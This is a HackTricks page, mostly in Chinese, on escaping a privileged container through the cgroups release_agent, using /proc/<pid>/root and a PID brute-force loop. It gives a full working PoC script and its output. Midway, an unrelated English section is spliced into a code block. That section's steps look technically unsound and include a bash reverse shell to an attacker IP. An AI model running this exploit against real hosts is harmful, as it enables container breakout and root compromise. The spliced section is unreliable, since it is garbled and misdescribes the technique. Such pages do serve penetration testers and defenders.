<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 介绍

在容器配置了一个存储驱动程序，该驱动程序公开了**挂载点的完整主机路径**（例如`overlayfs`）时，之前的PoC都能正常工作，但是有一些配置**并没有明显地公开主机文件系统的挂载点**。

在这个PoC中，我们将不使用容器在主机文件系统中的位置路径，而是在主机中发现一个容器PID。

## 不公开主机内路径位置的容器示例

### Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) 默认情况下通过 `9pfs` 挂载容器的根文件系统。这不会泄露有关 Kata Containers 虚拟机中容器文件系统位置的任何信息。

### 设备映射器
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
我在一个实时环境中看到了一个具有这个根挂载的容器，我相信该容器是使用特定的`devicemapper`存储驱动程序配置运行的，但是到目前为止，我无法在测试环境中复制这种行为。

# PoC

所需的一个关键信息是**相对于容器主机的完整路径，用于在容器内执行的文件**。如果无法从容器内的挂载点中分辨出这个路径，我们必须在其他地方寻找。

## /proc/\<pid>/root

Linux的`/proc`伪文件系统公开了系统上运行的所有进程的内核进程数据结构，包括在不同命名空间中运行的进程，例如容器内部的进程。可以通过在容器中运行命令并访问主机上的进程的`/proc`目录来展示这一点：
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_顺便说一下，`/proc/<pid>/root` 数据结构曾经让我困惑了很长时间，我一直无法理解为什么将符号链接指向 `/` 是有用的，直到我在 man 手册中读到了实际的定义：_

> /proc/\[pid]/root
>
> UNIX 和 Linux 支持每个进程的文件系统根目录的概念，通过 chroot(2) 系统调用设置。该文件是一个符号链接，指向进程的根目录，并且与 exe 和 fd/\* 的行为相同。
>
> 但请注意，该文件不仅仅是一个符号链接。它提供了与进程本身相同的文件系统视图（包括命名空间和每个进程挂载的集合）。

**`/proc/<pid>/root` 符号链接可以用作容器内任何文件的主机相对路径**：
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
{% hint style="warning" %}
**这将攻击的要求从需要知道容器内文件相对于容器主机的完整路径，变为需要知道容器中任意进程的pid。**
{% endhint %}

## Pid Bashing <a href="#pid-bashing" id="pid-bashing"></a>

这实际上是比较容易的部分，Linux中的进程ID是数字且按顺序分配的。`init`进程被分配进程ID `1`，随后的进程被分配递增的ID。为了确定容器内进程的**主机进程ID，可以使用暴力递增搜索**：
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Docker Breakout Privilege Escalation: Release Agent Exploit (Relative Paths to PIDs)

## Introduction

In certain scenarios, it is possible to exploit the release agent feature in Docker to escalate privileges and gain root access on the host system. This technique involves manipulating relative paths to process IDs (PIDs) within the Docker container.

## Exploitation Steps

1. Start by creating a new Docker container with the `--privileged` flag to gain access to the host's devices:

   ```bash
   docker run -it --privileged <image>
   ```

2. Inside the container, create a new directory and navigate to it:

   ```bash
   mkdir /host_root
   cd /host_root
   ```

3. Create a new shell script named `release_agent.sh` with the following contents:

   ```bash
   #!/bin/sh
   echo "#!/bin/sh" > /host_root/release_agent.sh
   echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" >> /host_root/release_agent.sh
   ```

   Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port of your attacker machine.

4. Make the script executable:

   ```bash
   chmod +x /host_root/release_agent.sh
   ```

5. Set the `release-agent` configuration option to the path of the script:

   ```bash
   echo "/host_root/release_agent.sh" > /host_root/release-agent
   ```

6. Restart the Docker daemon:

   ```bash
   systemctl restart docker
   ```

7. Wait for the Docker daemon to restart and execute the release agent script:

   ```bash
   cat /proc/self/exe > /dev/null
   ```

8. At this point, the release agent script will be executed with root privileges on the host system. You should now have a reverse shell connection to your attacker machine.

## Mitigation

To prevent this privilege escalation technique, follow these recommendations:

- Avoid running containers with the `--privileged` flag unless absolutely necessary.
- Regularly update Docker to ensure you have the latest security patches.
- Implement strict access controls and limit the capabilities of containers.
- Monitor and review the release agent configuration to detect any unauthorized changes.

Remember that security is a continuous process, and it is important to stay updated with the latest security best practices.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
## 将所有内容整合在一起 <a href="#putting-it-all-together" id="putting-it-all-together"></a>

为了完成这次攻击，可以使用暴力破解技术来**猜测路径`/proc/<pid>/root/payload.sh`的PID**，每次迭代将猜测的pid路径**写入cgroups的`release_agent`文件，触发`release_agent`，并查看是否创建了输出文件。

这种技术的唯一注意事项是它绝对不是一个隐蔽的方法，可能会导致pid计数非常高。由于没有长时间运行的进程，这**应该**不会导致可靠性问题，但请不要引用我。

下面的PoC实现了这些技术，提供了一个比Felix原始PoC中使用cgroups的`release_agent`功能逃逸特权容器更通用的攻击方法：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
在具有特权的容器中执行PoC应该会提供类似以下的输出：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# 参考资料

* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
